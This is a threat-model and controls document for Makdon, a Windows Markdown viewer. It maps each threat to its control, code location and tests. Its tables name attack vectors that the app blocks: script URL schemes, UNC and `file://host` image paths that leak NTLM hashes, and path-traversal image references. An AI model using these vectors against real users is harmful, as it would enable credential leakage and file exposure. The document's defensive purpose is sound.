# Makdon Security: Threat Model and Controls

**Purpose:** describe what Makdon protects, from whom, with which controls (code location and the tests that guard them), and the limitations that remain.
**Readers:** developers and security reviewers. Related decisions: [DESIGN-DECISIONS.md](DESIGN-DECISIONS.md) (ADR-06, 07, 08, 10, 11, 17, 18, 24, 25). Test map: [TESTING.md](TESTING.md).

All claims here were checked against the code at the time this document was written. Parts that depend on the behavior of external libraries or on the operating system, and cannot be proven from the repo, are marked "not verified". The repo does not yet have a vulnerability reporting policy (there is no `SECURITY.md` at the root or in `.github/`); report vulnerabilities to the repo owner.

## 1. Assets, actors, and trust boundaries

| Asset | Why it matters |
| --- | --- |
| Files on the user's machine (outside the opened document) | Must not be exported or read by an opened document |
| The user's network identity (IP address, NTLM hash) | Must not leak to hosts pointed to by untrusted documents |
| Contents of the user's documents | Must not be corrupted or silently overwritten |
| Application stability | Untrusted input must not make it crash or freeze indefinitely |
| Registry and the user's application data | Scripts and tests must not damage them |

| Actor | Assumed capability |
| --- | --- |
| Untrusted `.md` document author | Controls the contents of a file the user opens (text, raw HTML, link and image URLs, size) |
| Recipient of the exported HTML | Opens the export file in a browser |
| Other processes of the same user | Can change files on disk, write to the single-instance pipe, and run Makdon again |
| Other Windows users on the same machine | Must not be able to send commands to this user's instance |
| The user | Trusted (e.g., presses "Load remote images" (Muat gambar remote), types their own regex) |

Trust boundary: **document contents** and **files on disk that change from outside** are untrusted. Application code, the user's `settings.json` (which is still validated), and input typed by the user are trusted. Makdon does not execute document contents (there are no scripts, macros, or plugins).

## 2. Controls per threat

The "Test" column lists the test name and `file:line`. A line number without a file name refers to the file named earlier in the same cell (in 2.7, a line number without a file name means `SingleInstanceServerTests.cs`). "-" means no test guards that control.

### 2.1 Untrusted input: `.md` files

| Threat | Control | Code location | Test |
| --- | --- | --- | --- |
| A very large file exhausts memory | Confirmation above 50 MB, refused above 500 MB; `OutOfMemoryException` during load is caught | `MainWindow.xaml.cs:20-21, 261-265, 280-306` | - |
| Broken encoding or invalid bytes are silently "repaired" and then overwritten | `lossy` flag + confirmation before saving; non-BOM to Windows-1252 (identical round-trip) | `TextFileIO.cs:40-90`, `MainWindow.xaml.cs:431-434` | `Decode_EachBomWithInvalidBody_IsLossy_*` (`IoAndUtilityCoverageTests.cs:43`), `Lossy_*` (`DocumentTabConflictEdgeTests.cs:482-578`) |
| An image that exists but cannot be decoded takes down the whole preview | `ReplaceUnloadableImages` + error document; everything is logged | `DocumentView.xaml.cs:459-536` | `UndecodableImage_*` (`DocumentViewLifecycleTests.cs:414-459`), `DocumentTabTests.cs:955-984` |
| A render error crashes the application | `ShowRenderError` (does not throw to the dispatcher). The synchronous path (documents under 100k characters, `:364`) does not catch `OutOfMemoryException`: OOM escapes and closes the application through the fatal path. The background path `RenderInBackground` (>= 100k characters, `:406`) catches **all** errors, including OOM, and shows them as an error document. The print and print preview paths differ: see [2.12](#212-print-preview-and-print) | `DocumentView.xaml.cs:364-368, 406-410, 417-422` | partly through the broken-image tests above |
| Argument or path that is relative or invalid | `App.ToFullPath` (an invalid path is returned as is; `MainWindow.OpenFile` reports it), friendly error messages | `App.xaml.cs:49-56`, `MainWindow.xaml.cs:238-255` | - |

### 2.2 Raw HTML: preview vs export

| Threat | Control | Code location | Test |
| --- | --- | --- | --- |
| Scripts, attributes, or `<iframe>` from raw HTML end up in the exported HTML | `ExportPipeline`: `DisableHtml()` (escaped), removes `GenericAttributesExtension` and `MediaLinkExtension` | `MarkdownSupport.cs:67-78` | `RawHtml_IsEscaped` (`HardeningTests.cs:28`), `RawHtmlInAnyPosition_IsEscaped_NeverEmittedAsTags` (`ExportAndImageSecurityTests.cs:150`), `ExportPipeline_ParsesInlineHtmlAsText_*` (`:161`), `MediaLinks_NeverBecomeIframeVideoOrAudio` (`:174`), `GenericAttributes_AreNotInjected_*` (`:183`) |
| Title or placeholder template is injected | Title is `WebUtility.HtmlEncode`; template is filled in a single pass | `HtmlExporter.cs:14, 56-59` | `Title_IsHtmlEscaped` (`HtmlAndMarkdownSupportTests.cs:242`), `Body_ContainingPlaceholderTokens_IsNotReinterpreted` (`:266`) |
| The export pipeline "leaks" into the preview, or vice versa | Two separate pipeline instances | `MarkdownSupport.cs:58-67` | `ExportPipeline_DoesNotAffectThePreviewPipeline` (`HardeningTests.cs:176`) |
| Raw HTML in the preview | The preview pipeline still parses `HtmlBlock`, but the result is a WPF `FlowDocument` (not HTML). README: raw HTML is "diabaikan" (ignored) in the preview | `MarkdownSupport.cs:58-61`, `DocumentView.xaml.cs:489-500` | the test only ensures the parser produces `HtmlBlock` (`HardeningTests.cs:176`); that the Markdig.Wpf renderer ignores it is library behavior, **not verified** in this repo |

### 2.3 URL schemes and allowlist

`MarkdownSupport.ClassifyUrl` (`MarkdownSupport.cs:86-115`) is an allowlist: `Relative`, `Http`, `Mailto`, `DataImage` (`png|jpeg|gif|webp`), `LocalFile` (drive letter or `file:///` without a host); everything else is `Blocked`. Spaces and control characters are removed before the scheme is detected (this prevents `java\tscript:`); the prefixes `\\`, `//`, `/\`, `\/` are `Blocked`.

| Threat | Control | Code location | Test |
| --- | --- | --- | --- |
| `javascript:`, `vbscript:`, `data:text/html`, `file://host`, `ftp:` in export links | `SanitizeForExport`: an unsafe href becomes `#`; the link text stays as inert text | `MarkdownSupport.cs:213-229` | `LinkVectors_NeverProduceAnUnsafeHref` (20 vectors: entity `&#106;`, tab/CR/LF, mixed case, references, links containing images; `ExportAndImageSecurityTests.cs:71`), `UnsafeLinkUrls_BecomeInertAnchor` (`HardeningTests.cs:64`), `LinkTextOfAnUnsafeLink_IsKeptAsInertText` (`ExportAndImageSecurityTests.cs:99`) |
| Autolinks with dangerous schemes | Unsafe autolinks are replaced with `LiteralInline` (email is excluded) | `MarkdownSupport.cs:225-228` | `Autolinks_WithUnsafeSchemes_AreNotLinked` (`ExportAndImageSecurityTests.cs:114`), `Autolink_WithScriptScheme_IsNotLinked` (`HardeningTests.cs:109`) |
| Breaking out of an attribute via quotes in title or alt | Markdig HTML renderer's built-in escaping | `HtmlExporter.cs:50-54` | `LinkWithAngleBracketsAndTitle_*` (`ExportAndImageSecurityTests.cs:81`), `ImageAlt_QuotesCannotBreakOutOfTheAttribute` (`:90`) |
| Images with dangerous schemes in the export | `SanitizeImage`: only `Http`, valid `DataImage`, or local images; anything else becomes the text `[gambar diblokir: alt]` (image blocked: alt) with alt escaped | `MarkdownSupport.cs:233-262` | `UnsafeImageUrls_AreReplacedByText` (`HardeningTests.cs:126`), `UnsafeImage_AltIsEscapedInReplacementText_*` (`ExportAndImageSecurityTests.cs:195`) |
| One property test for the entire export | Every `href`/`src` in the export output must pass the allowlist | - | `AssertAllUrlsAreSafe`, `ExportOfMixedHostileDocument_PassesTheGlobalUrlAllowlist` (`ExportAndImageSecurityTests.cs:40, 312`) |
| `ClassifyUrl` misclassifies | Category matrix | `MarkdownSupport.cs:86-115` | `ClassifyUrl_Categories` (`HardeningTests.cs:103`), `ClassifyUrl_BlocksUncSchemeRelativeAndUnknownSchemes` (`:87`) |

### 2.4 UNC, SMB, NTLM

Opening a UNC path (`\\host\share\x.png`) or `file://host/...` makes Windows contact that host (SMB) and can leak the user's NTLM hash. Controls:

| Surface | Control | Code location | Test |
| --- | --- | --- | --- |
| Images in preview or print | `ResolveImageUrls` always blocks `Blocked`/`Mailto` (independent of the remote-block option). After classification, only `file:` without a host (`IsUnc` and `Host` are checked) is passed to WPF | `MarkdownSupport.cs:130-172` | `UncVariants_AreBlocked_RegardlessOfBlockRemote` (`ExportAndImageSecurityTests.cs:360`, 10 variants including `file:////host`, `file://localhost/c$`), `UncAndHostFileUrls_AreAlwaysBlocked` (`HardeningTests.cs:218`), `ProtocolRelativeUrl_*` (`ExportAndImageSecurityTests.cs:401`); for print documents: `FtpUncFileHostAndDataImages_AreBlockedInThePrintDocument_AndNeverTouchTheNetwork` (`PrintContentAndCommandTests.cs:213`, see 2.12) |
| Images from a relative path that resolve to UNC | `IsAllowedLocalPath`: UNC only if the document itself is on the same share (roots are compared, case-insensitive); the roots `\\?\` and `\\.\` do not match the document root, so they are refused | `MarkdownSupport.cs:188-197` | `IsAllowedLocalPath_Matrix` (`ExportAndImageSecurityTests.cs:487`), `LocalPathResultingInUncShare_*` (`HardeningTests.cs:235`) |
| Images in export | UNC/`//host`/`file://host` prefixes = `Blocked`, then a marker text; never read | `MarkdownSupport.cs:91-92, 258-259` | `UncAndSchemeRelativeImageUrls_AreReplacedByText_NeverEmitted` (`ExportAndImageSecurityTests.cs:214`) |
| Document opened from a UNC share | Allowed (the user chose it); its relative images on the same share are allowed | `MarkdownSupport.cs:188-197` | `IsAllowedLocalPath_Matrix` |
| Clicking a relative or `file:` link to a `.md` file | `MarkdownSupport.ResolveLinkTarget` (no I/O): `file:` with a host and UNC are rejected, device paths `\\?\`/`\\.\` are rejected, the markdown extension is checked first, then `IsAllowedLocalPath`; `File.Exists` is called only afterwards (R1, closed: [section 4](#4-risks-already-closed)) | `MarkdownSupport.cs:361-412`, `DocumentView.xaml.cs:688-712` | `LinkResolutionTests.cs` (see section 4) |

### 2.5 Remote images and FTP (tracking)

| Threat | Control | Code location | Test |
| --- | --- | --- | --- |
| `http(s)` images track the reader (tracking pixels) | `BlockRemoteImages` defaults to `true`: replaced with `[gambar remote diblokir]` (remote image blocked); option in the menu `Tampilan` (View) > "Muat gambar remote" (Load remote images) | `MarkdownSupport.cs:145-147`, `DocumentView.xaml.cs:56`, `AppSettings.cs:50`, `MainWindow.xaml.cs:125-131` | `HttpVariants_BlockedOnlyWhenRequested` (`ExportAndImageSecurityTests.cs:389`), `HttpImages_AreBlockedOnlyWhenRequested` (`HardeningTests.cs:245`), `BlockRemoteImages_DefaultsToTrue_AndRoundTrips` (`:726`), `RefreshPreview_AfterBlockRemoteImagesToggle_*` (`:606`) |
| `ftp:`/`gopher:`/`ws:`/`pack:` etc. open a connection | All schemes other than `http(s)` and local `file:` are blocked **even** when the remote option is enabled | `MarkdownSupport.cs:137-148, 150-161` | `NonHttpSchemes_AreBlockedInPreview_EvenWhenRemoteImagesAreAllowed` (`ExportAndImageSecurityTests.cs:443`), `FtpImage_ShowsMarker_InPreview_*` (`DocumentViewLifecycleTests.cs:488`), **`RemoteImageOverFtp_IsNotFetched_WhenRemoteImagesAreBlocked`** (a local TCP listener proves no connection is made, `:510`) |
| `data:` breaks the preview | Replaced with a marker in the preview; in export only `image/` png, jpeg, gif, or webp | `MarkdownSupport.cs:139-141, 106-107` | `DataImages_GetPreviewMarker_RegardlessOfBlockRemote` (`ExportAndImageSecurityTests.cs:455`), `ExportAllowlist_StillKeepsValidDataImages_*` (`:464`), `DataImage_ShowsMarker_*` (`DocumentViewLifecycleTests.cs:468`) |
| "Load remote images" mode is on | No additional control; the user chooses | - | - |

### 2.6 Path traversal and export privacy

| Threat | Control | Code location | Test |
| --- | --- | --- | --- |
| `![](../../secret.png)` or `![](C:\Users\...\photo.png)` exports another file into the HTML | Local images are embedded only if `IsInsideDocumentFolder` (document folder prefix + separator, case-insensitive) and `IsAllowedLocalPath`; otherwise the text `[gambar di luar folder dokumen tidak disertakan]` (image outside the document folder not included) | `MarkdownSupport.cs:301-302, 327` | `RelativeImage_ResolvingOutsideTheDocumentFolder_*`, `AbsoluteImage_OutsideTheDocumentFolder_*` (without the path leaking), `SiblingFolderSharingTheNamePrefix_*` (`ExportImageBudgetAndPrivacyTests.cs:36-71`), `Images_InsideTheDocumentFolder_*` (`:74`) |
| An unsaved document (no folder) embeds local files | `baseDir == null`: nothing is "under the document folder" | `MarkdownSupport.cs:283-297` | `WithoutADocumentFolder_AbsoluteLocalImages_AreNotEmbedded_*` (`ExportImageBudgetAndPrivacyTests.cs:86`) |
| Machine path leaks into the HTML | Relative paths that are not embedded stay relative; absolute local paths are replaced with text; never `file:///C:/...` | `MarkdownSupport.cs:242-256` | `RelativeImage_IsEmbeddedAsDataUri_AndNeverLeaksLocalPath` (`HtmlAndMarkdownSupportTests.cs:283`), `AbsoluteLocalImage_OverTwoMegabytes_OrSvg_OrMissing_*` (`ExportAndImageSecurityTests.cs:248`) |
| Symlink inside the folder that points outside | The symlink target is checked (`ResolveLinkTarget`) and treated as "outside" | `MarkdownSupport.cs:333-334` | **-** (no test; requires the right to create symlinks) |
| Export loads excessive memory (many large images) | 2 MB per image, total budget of 30 MB per occurrence, cache per path (the same image is read once), budget checked before reading the file; `OutOfMemoryException` is caught | `MarkdownSupport.cs:37-43, 330-345`, `MainWindow.xaml.cs:731-736` | `TotalBudget_*` (`ExportImageBudgetAndPrivacyTests.cs:100, 111`), `SameImageReferencedManyTimes_IsEncodedOnce_*` (`:123`), `ManyReferencesToTheSameLargeImage_StayWithinTheTotalBudget` (`:137`), `LocalImage_AtExactlyTwoMegabytes_*` (`ExportAndImageSecurityTests.cs:235`); OOM path -: |
| Query, fragment, or percent-encoding tricks file lookups | Query and fragment are discarded, `Uri.UnescapeDataString` is applied, the path is normalized with `GetFullPath` before the folder check | `MarkdownSupport.cs:310-323` | `RelativeImage_QueryFragmentAndPercentEncoding_*` (`ExportAndImageSecurityTests.cs:288`), `Images_InsideTheDocumentFolder_*` (`..` that stays inside) |

### 2.7 Single-instance: pipe and mutex

Test line numbers in this table refer to `SingleInstanceServerTests.cs`, unless stated otherwise.

| Threat | Control | Code location | Test |
| --- | --- | --- | --- |
| Another user or session sends commands | Pipe with `PipeOptions.CurrentUserOnly` on both server and client; the pipe name contains the user's SID and the session id; mutex `Local\` per session | `SingleInstance.cs:47, 61-62, 104-105, 189` | `PipeName_ContainsTheWindowsSessionId_*` (`SingleInstanceServerTests.cs:245`); **rejection of other users is not tested** (requires a second account) |
| Message contains relative or odd paths | Only `Path.IsPathFullyQualified` (drive or UNC); `C:rel.md` and `\rel.md` are rejected | `SingleInstance.cs:163-172` | `ParseMessage_RejectsRootedButNotFullyQualifiedPaths` (`:106`), `Server_ForwardsOnlyAbsolutePaths_AndNoMoreThanSixtyFour` (`:124`), `Message_RoundTrips_AndOnlyAbsolutePathsAreAccepted` (`HardeningTests.cs:798`) |
| Flood of paths | Maximum 64 paths, each path under 32768 characters, message truncated at 256K characters | `SingleInstance.cs:17-19, 154, 169-170` | `ParseMessage_CapsAtSixtyFourFiles_*` (`:45`), `ParseMessage_SkipsBlankLinesAndOverlongPaths` (`:87`), `Server_OversizedMessage_DoesNotKillTheServer_*` (`:183`) |
| Forged message or wrong header | Header must be exactly `MAKDON1` (case-sensitive, no spaces); the rest is discarded | `SingleInstance.cs:166` | `ParseMessage_HeaderMustMatchExactly` (`:73`), `Server_IgnoresMessagesWithWrongHeader_*` (`:167`) |
| Path injection through line breaks | `BuildMessage` drops entries containing `\n`/`\r` | `SingleInstance.cs:174-175` | `BuildMessage_DropsEntriesContainingLineBreaks_*` (`:114`) |
| A stalled client holds the server (DoS) | Read timeout of 5 seconds per client; a stalled client does not count as a server failure | `SingleInstance.cs:35, 95-122` | `Server_StalledClient_IsDroppedAfterTheReadTimeout_*` (`:209`), `Server_SurvivesMoreStalledClientsThanTheFailureLimit` (`:258`) |
| A callback throws and kills the server | `Deliver` catches and logs (except OOM) | `SingleInstance.cs:136-143` | `Server_CallbackThatThrows_IsLoggedAndTheServerKeepsServing` (`:280`) |
| Received paths are opened as tabs | Only opens files selected by the same user's process; nothing is executed | `App.xaml.cs:59-60`, `MainWindow.xaml.cs:65-76` | - |

### 2.8 Registry scripts

| Threat | Control | Code location | Test |
| --- | --- | --- | --- |
| A script damages the system registry or requires admin | Only `Registry.CurrentUser` (HKCU); `SupportsShouldProcess` (`-WhatIf` prints without writing) | `scripts/register-file-association.ps1:37, 77, 81`; `unregister-file-association.ps1:20, 42, 102` | - (CLAUDE.md forbids running real registry scripts in tests) |
| Subkey name injection through `-Extensions` | `-Extensions` is normalized to lowercase, then validated with `'^\.[a-z0-9]+$'` (`-cnotmatch`) | `register-file-association.ps1:68-70`, `unregister-file-association.ps1:36-38` | - |
| The user's existing default value is lost | `-SetDefault` backs up to `HKCU\Software\Makdon\PreviousDefault`; unregister restores it and only touches a value that points exactly to the Makdon ProgID; `UserChoice` is not touched | `register-file-association.ps1:102-120`, `unregister-file-association.ps1:57-114` | - |
| Execution: `powershell -ExecutionPolicy Bypass` in the README | Only for the repo's scripts; inspect the script contents and run `-WhatIf` first | README, "Open with" (file association) section | - |

The application itself only **reads** the registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize\AppsUseLightTheme` (`Theming.cs:45-56`; an access error is treated as the light theme). `SystemEvents.UserPreferenceChanged` is listened to only when the "Follow system" (Ikuti Sistem) mode is active.
Since the distribution feature, the application also **writes** to HKCU for the "Open with" registration in portable mode (`FileAssociation`, same table as the installer and scripts); its controls are in 2.13.

### 2.9 Error log (`crash.log`)

| Item | Fact | Code location | Test |
| --- | --- | --- | --- |
| What is logged | Timestamp (`InvariantCulture`), context strings written by the caller, and `exception.ToString()` (type, message, stack trace, inner exception). .NET error messages often contain file paths. Some contexts explicitly include a URL/path: `"Gambar tidak dapat ditampilkan: {image.Url}"` (image cannot be displayed), `"Gagal membuka tautan: {uri}"` (failed to open link). Print Preview failures are also logged in full with `exception.ToString()` (`"Penyusunan pratinjau cetak gagal"` (print preview build failed), `"Pratinjau cetak gagal"` (print preview failed), `"Pratinjau cetak kehabisan memori"` (print preview out of memory), `"Galat susulan pada penyusunan pratinjau cetak"` (follow-up error in print preview build), `"Pembersihan pratinjau cetak"` (print preview cleanup)), but they are never printed to paper (2.12). The document contents are not logged deliberately (the code never writes document text to the log); however, document contents may appear if they are part of a library message (**not verified**) | `CrashLog.cs:27-49`, `DocumentView.xaml.cs:521, 682` | `Write_AppendsContextAndExceptionToLogFile_*` (`CrashLogTests.cs:87`), `Write_RecordsContextExceptionTypeAndTimestamp_*` (`IoAndUtilityCoverageTests.cs:633`) |
| Location and permissions | `%LOCALAPPDATA%\Makdon\crash.log` (installed) or `data\crash.log` next to the exe (portable), from `AppPaths.CrashLogPath`; plain text, not encrypted; inherits the user folder's permissions (no dedicated ACL in code) | `CrashLog.cs:25` | - |
| Size limit | If the file is over 512 KB before writing, the **entire** file is deleted and then the new entry is written | `CrashLog.cs:16, 37` | `Write_LogOneByteOverTheLimit_IsDiscarded_*`, `Write_RepeatedlyOverTheLimit_NeverGrowsWithoutBound` (`IoAndUtilityCoverageTests.cs:567-591`) |
| The log must not crash the application | All I/O errors are ignored; writes are serialized with `lock` | `CrashLog.cs:33-48` | `Write_WhenLogPathIsUnwritable_DoesNotThrow` (`CrashLogTests.cs:102`), `Write_ConcurrentWriters_*` (`IoAndUtilityCoverageTests.cs:616`) |
| Dialogs do not flood the user | The same type + message within 10 seconds is only logged | `CrashLog.cs:78-90` | `ShouldShowDialog_*` (`CrashLogTests.cs:46-66`) |
| Tests do not pollute the real log | `TestLogRedirect` | `Support/TestLogRedirect.cs` | `Write_WithoutExplicitPath_UsesTheRedirectedLogPath_*` (`IoAndUtilityCoverageTests.cs:647`) |
| The error dialog shows the exception message to the user | Message + (for fatal errors) the type name are shown in a `MessageBox` | `App.xaml.cs:83-100` | - |

### 2.10 Regex and ReDoS

Regex patterns are typed by the user in the Find panel (Cari) (they do not come from the document), but they can be pasted from untrusted sources, and they run against the document text on the UI thread.

| Threat | Control | Code location | Test |
| --- | --- | --- | --- |
| Catastrophic backtracking freezes the UI | `Regex` with `matchTimeout` of 2 seconds per call; total limit of 4 seconds per search, checked on every iteration (also for empty matches and `$1` expansion); `RegexMatchTimeoutException` -> message "Pencarian terlalu lama" (search took too long) | `SearchEngine.cs:17-25, 41-58` | `FindAll_CatastrophicRegex_ThrowsRegexMatchTimeout`, `TryFindAll_CatastrophicRegex_TimesOutWithMessage` (`SearchEngineTests.cs:366-379`), `FindAll_TotalDeadline_*` (`IoAndUtilityCoverageTests.cs:1013-1068`) |
| A slow pattern is re-run on every keystroke or text change | Debounce of 250 ms; a pattern+option that timed out is not re-run until it changes (`timedOutKey`) | `FindReplaceBar.xaml.cs:20, 28-30, 164-169` | `TimedOutPattern_IsNotRerunOnEditorChangesOrFindNext_*` (`DocumentViewLifecycleTests.cs:213`) |
| Very many results | `MaxResults` of 20,000 for markers; "Ganti Semua" (Replace All) has no limit but stays under the time limit | `SearchEngine.cs:20, 252` | `FindAll_Literal_StopsAtMaxResults` etc. (`SearchEngineTests.cs:184-211`), `ReplaceAll_*MoreThanMaxResults_*` (`:591, 602`) |
| Invalid pattern | `ArgumentException` -> "Regex tidak valid" (invalid regex); a pattern ending with `\` does not crash | `SearchEngine.cs:197-217`, `NormalizeLineEndings` | `FindAll_PatternEndingWithBackslash_*` (`IoAndUtilityCoverageTests.cs:908`) |

### 2.11 Stored data and document integrity

| Threat | Control | Code location | Test |
| --- | --- | --- | --- |
| `settings.json` is corrupted or maliciously edited | `Load` does not throw; wrong type = default; `Sanitize` tidies (theme, zoom 50-300, list, session); a session is only opened if `File.Exists` | `AppSettings.cs:61-76, 128-145`, `MainWindow.xaml.cs:189-207` | `Load_CorruptOrWrongShapeJson_*`, `Load_Session_DropsBadTabsAndFixesCaretAndActiveIndex` (`AppSettingsTests.cs:54, 196`) |
| A document is silently overwritten by a save | Conflict detection by hash + stamp, dialog Overwrite (Timpa) / Reload from Disk (Muat dari Disk) / Cancel (Batal), `ExternalChangeException` without a handler | `DocumentTab.cs:149-200` | `SaveTo_ChangedOnDisk_WithoutHandler_Throws_*` (`HardeningTests.cs:311`), `DocumentTabConflictEdgeTests` |
| A write damages the file if it fails | Atomic; temp is cleaned up; fallback only for access denied / long name | `TextFileIO.cs:141-202` | see ADR-01 |
| `settings.json` written concurrently by several instances | `SaveMerged` merges `RecentFiles` | `AppSettings.cs:99-110` | `AppSettingsMergeTests`, `AppSettingsMergeEdgeTests` |

### 2.12 Print Preview and Print

Both paths use the same print model (`PrintSnapshot` -> `ParsePrintSnapshot` -> `BuildPrintDocument`): direct Print (Ctrl+P) and Print Preview (Ctrl+Shift+P). See [ARCHITECTURE.md](ARCHITECTURE.md#49-print-preview-ctrlshiftp-and-print).

| Threat | Control | Code location | Test |
| --- | --- | --- | --- |
| An untrusted document tracks the reader or triggers SMB/NTLM through images when printed or previewed | The snapshot is parsed with the same `ParseDocument` as the main preview, so `ResolveImageUrls` always blocks UNC, `file://host`, `//host`, `ftp:`, other schemes, and `data:`, and `http(s)` according to the remote-block flag. The flag is taken from the snapshot (the value when the preview was opened), not the global value at re-layout time | `DocumentView.xaml.cs:588-590`, `PrintLayout.cs:92-125` | `FtpUncFileHostAndDataImages_AreBlockedInThePrintDocument_AndNeverTouchTheNetwork` (two `blockRemote` cases; a local TCP listener proves no connection is made, `PrintContentAndCommandTests.cs:213`), `SnapshotBlockRemoteFlag_IsHonoured_NotTheCurrentGlobalSetting` (`:264`), `PrintDocument_StillBlocksRemoteAndUncImages` (`PrintPreviewTests.cs:245`), `LargeDocument_IsParsedInTheBackground_*` (`PreviewBuildTests.cs:750`) |
| Profile paths or error messages leak to paper or PDF through an error document | The print path does not create an error document: `CreateFlowDocument(throwOnFailure: true)` throws an `InvalidOperationException` with a friendly message without a path (the error type name + "Rincian ada di crash.log." (details are in crash.log)); the window shows it in the error panel and the Print button is disabled. The built-in error document (which contains `CrashLog.LogPath`) stays only in the on-screen main preview. [ADR-24](DESIGN-DECISIONS.md#adr-24-error-documents-are-never-printed) | `DocumentView.xaml.cs:455-483, 529-535` | `RenderFailure_OnThePrintPath_*`, `RenderFailure_InThePrintWindow_*`, `RenderFailure_InTheMainPreview_StillShowsTheErrorDocument_AsBefore` (`PrintContentAndCommandTests.cs:88, 122, 148`) |
| Local paths leak through the page footer | The footer only contains the title = `DocumentTab.Title` (the file name from `Path.GetFileName`, or the document name when untitled) and "Halaman X dari N" (page X of N). The document folder is only used to resolve images and is not drawn. The same file name also becomes the window title and the print job name visible in the printer queue (`dialog.PrintDocument(..., snapshot.Title)`) | `DocumentTab.cs:87`, `HeaderFooterPaginator.cs:64-88`, `PrintPreviewWindow.xaml.cs:447` | Structural; no test specifically asserts "no path" in the footer (`HeaderFooterPaginatorTests` uses test titles, including odd and very long names) |
| Temporary files containing document contents are left on disk | The preview XPS package is only in a `MemoryStream` (released in `Cleanup`); the application creates no temporary files. Printer spooler/driver is outside the application's control (**not verified**) | `PreviewBuild.cs:160-165, 304-329` | `Dispose_AfterReady_ReleasesPagesAndPackage_AndIsIdempotent` (`PreviewBuildTests.cs:265`), `ManyCyclesInARow_DoNotAccumulatePackages` (`:410`) |
| Very large or image-heavy documents exhaust memory in the preview | `Guard` catches all errors including OOM: the cycle becomes `Failed` with a memory message; window creation is caught separately. Direct Print and the Print button in the preview **do not** catch OOM (R8) | `PreviewBuild.cs:211-238`, `MainWindow.xaml.cs:774-783` | `SubscriberThatThrows_FailsTheBuild_AndNeverReachesTheDispatcher` (OOM variant, `PreviewBuildTests.cs:468`); a real OOM path is not tested |
| A preview error takes down the application | All `PreviewBuild` handlers are wrapped in `Guard`; errors in the window code are caught by `ShowFailure`; tests fail if an unexpected error escapes to the dispatcher (`FailOnUnexpectedDispatcherErrors`) | `PreviewBuild.cs:211-238`, `PrintPreviewWindow.xaml.cs:103-150` | `ChangingLayoutManyTimes_WhileRendering_ThenClosing_LeavesNoDispatcherError` (`PrintPreviewWindowBehaviorTests.cs:950`), `RepeatedCycles_DisposedWhileRendering_*` (`PreviewBuildTests.cs:608`) |
| A document is printed on paper or orientation the user did not expect | `ConfirmPaperMatchesPreview` asks for confirmation when the dialog ticket differs from the preview | `PrintPreviewWindow.xaml.cs:466-486` | `TicketMatches_*` (pure comparer, `PrintContentAndCommandTests.cs:441-528`); `ConfirmPaperMatchesPreview` itself is not tested |

Limitation: `http(s)` images that load asynchronously (when the user has turned off remote blocking) may not yet appear on the preview's XPS pages (`PreviewBuild.cs:23-25`); this is a matter of completeness, not a leak. The behavior of `http(s)` images in direct Print is **not verified**.

### 2.13 Installation, portable mode, and registry

Test line numbers in this table refer to `FileAssociationTests.cs` and `AppPathsTests.cs`, unless stated otherwise. Registry writes always go through `IRegistryStore`, so tests use `FakeRegistryStore` and do not touch the real registry.

| Threat | Control | Code location | Test |
| --- | --- | --- | --- |
| The application writes to the registry outside the user's account | All writes and deletions use `RegistryRoot.CurrentUser` (HKCU); no administrator rights. The registry table is the same as the installer and scripts (DISTRIBUTION 4.1) | `FileAssociation.cs:243-271`, `FileAssociation.cs:213-237` | `Register_OnACleanRegistry_WritesExactlyTheSpecTable_InHkcuOnly_AndNotifiesTheShellOnce` (`:69`), `Register_NeverWritesTheExtensionDefault_OrUserChoice` (`:80`) |
| Portable registration masks the installed version (HKCU overrides HKLM) | `Register` refuses if an installation is found in HKCU or HKLM; startup offers to unregister if an installation exists and HKCU points to this exe | `FileAssociation.cs:189-192`, `FileAssociation.cs:178-184` | `Installation_AllUsersBlocksEvenWhenHkcuAlreadyPointsToThisExe` (`:141`), `CheckStartup_InstallationPlusHkcuPointingHere_OffersToUnregister` (`:412`) |
| Removing a registration that belongs to another program | `Unregister` only deletes keys whose command points to this exe (compared after path normalization); `Software\Makdon` is removed only if empty | `FileAssociation.cs:213-237` | `Unregister_WhenRegisteredByAnotherExe_IsNotOwned_AndDeletesNothing` (`:311`), `Unregister_OnlyRemovesThePartThatPointsToThisExe` (`:375`) |
| Silently overwriting the registration of another exe | Another portable Makdon copy and an exe without a marker are only replaced after confirmation (an exe without a marker gets a warning) | `FileAssociation.cs:197-205`, `MainWindow.xaml.cs:560-603` | `Register_OverAnotherPortableCopy_NeedsConfirmation_ThenReplacesWhenConfirmed` (`:239`), `Register_OverAnExeWithoutMarker_NeedsConfirmation_ThenReplacesWhenConfirmed` (`:259`) |
| Abnormal registry values (unclosed quote, empty, broken path) | `ExtractExePath` takes the first token and then `Path.GetFullPath`; path errors are treated as not existing and are not thrown | `FileAssociation.cs:280-305` | `ExtractExePath_*` (`:446-470`), `Installation_PathWithInvalidCharacters_IsIgnored_NotThrown` (`:196`) |
| A relative command in the registry is resolved against the working folder, so another exe is taken for this exe and "Unregister" deletes someone else's registration | Relative commands are not normalized (`ExtractExePath` rejects them) and are classified as `OtherExe`; "Unregister" only removes a command with the full path identical to this exe | `FileAssociation.cs:155-162, 280-305` | `RelativeCommand_IsNeverNormalizedAgainstTheCwd` (`FileAssociationTests.cs:496`), `RelativeCommand_IsAnotherExe_NotThisExe_NotStale_AndUnregisterDoesNotRemoveIt` (`:502`) |
| A network path (UNC) forces the UI thread or startup to read a share (SMB/NTLM) | `IsNetworkPath` skips the file check: UNC is classified as `OtherExe` without `File.Exists`, and UNC installations are ignored | `FileAssociation.cs:106-125, 167, 308-310` | `IsNetworkPath_RecognizesUncAndDevicePaths_*` (`:533`), `UncRegistration_IsOtherExe_WithoutTouchingTheFileSystem_*` (`:541`), `UncInstallationPath_IsIgnored_WithoutTouchingTheFileSystem` (`:557`) |
| An exe with a different name or one that has disappeared gets registered, so the `Applications\Makdon.exe` key does not match its file | `Register` refuses with `ExeNotFound` and writes nothing | `FileAssociation.cs:193-195, 36` | `Register_WhenTheExeWasRenamed_IsRejected_AndWritesNothing` (`:578`) |
| Verifying the installer on a developer machine overwrites or removes an existing installation | `-VerifyInstallerContents` only runs in CI (`GITHUB_ACTIONS=true`) or with `-Force`, and refuses if the `_is1` key exists in HKCU or HKLM | `scripts/build-release.ps1:174-188` | No automated test |
| Data that the portable mode keeps can be read by whoever holds the media | No technical control (not encrypted). Data stays in the exe folder; there is no fallback to `%APPDATA%` that would silently move the data. **Residual risk R15** | `AppPaths.cs:22, 35-41` | `MarkerNextToTheExe_MeansPortable_WithDataUnderTheExeFolder` (`AppPathsTests.cs:17`) |
